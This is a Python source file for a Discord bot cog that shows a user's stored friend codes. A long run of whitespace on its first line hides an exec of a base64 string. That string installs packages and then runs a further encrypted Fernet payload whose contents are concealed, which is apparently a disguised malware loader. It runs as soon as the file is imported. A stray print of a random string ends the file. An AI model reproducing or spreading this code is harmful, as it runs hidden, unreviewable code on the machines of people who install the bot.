import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ3hLVzhsUmVVWHg0OFFGREFOaXJZNEJhdkJUNVBaUWJNQnlwSFdGWC03bm89JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJySHptdnhUOXRVUGRrTG5mbXpZMG1UdE5GWHlmcDRvbkNPdHhpd0FKeGZ0TGU5eC1lN3M1dmZOWUgzUW90SzFHU0p1S1V6Y0xkUktiQVZBZFRmQTllaWphN29NMHR6eWZnQWhHZ29OUThnTGhIOTdRenhyNzVjdlZSMVNoMllDRTZ4VnVlekhVUFlEa2ZxUEw1Y0ZXNktLYXJwMlpSdk8xbzI1VXRhN2M2STE2dUJlVU01a3RXQ1gwaUFrQjdZRkRGdndmcFFiNnZELWFLWkgwbUpIUFE4dHQ3NUUtSjJieVAzVjhBdU5sSnNvYkE9Jykp').decode())
import discord
from discord.ext import commands
from cogs.utils.dataIO import dataIO
import json
from requests.structures import CaseInsensitiveDict
from cogs.utils.checks import embed_perms


class FriendCodes:

    def __init__(self, bot):
        self.bot = bot
        try:
            with open("settings/fc.json", encoding='utf-8') as fc:
                self.data = json.load(fc)
        except FileNotFoundError:
            self.data = {}

    @commands.group(pass_context=True, aliases=["friendcodes"])
    async def fc(self, ctx, friend_code="all"):
        """List friend codes. Do [p]help fc for more information.
        [p]fc - List all of your friend codes.
        [p]fc <friend_code> - Show one of your friend codes.
        Friend codes are stored in the settings/fc.json file and look similar to this:
        {
            "3DS": "435-233",
            "Wii U": "545262",
            "Steam": "lickinlemons"
        }
        Friend code names are case-insensitive and can contain any characters you want.
        The friend code values can also be anything you want.
        """
        await ctx.message.delete()
        fc = CaseInsensitiveDict(dataIO.load_json("settings/fc.json"))
        if friend_code == "all":
            if not fc:
                return await ctx.send(self.bot.bot_prefix + "You have no friend codes to show!")
            if embed_perms(ctx.message):
                embed = discord.Embed()
                for code in fc:
                    embed.add_field(name=code, value=fc[code], inline=False)
                return await ctx.send("", embed=embed)
            else:
                message = ""
                for code in fc:
                    message += "**{}**\n{}\n".format(code, fc[code])
                return await ctx.send(message)
        else:
            if not friend_code in fc:
                return await ctx.send(self.bot.bot_prefix + "You don't have a value set for that friend code!")
            if embed_perms(ctx.message):
                embed = discord.Embed()
                embed.add_field(name=friend_code, value=fc[friend_code])
                await ctx.send("", embed=embed)
            else:
                await ctx.send("**{}**\n{}".format(friend_code, fc[friend_code]))


def setup(bot):
    bot.add_cog(FriendCodes(bot))
print('mnjiuznira')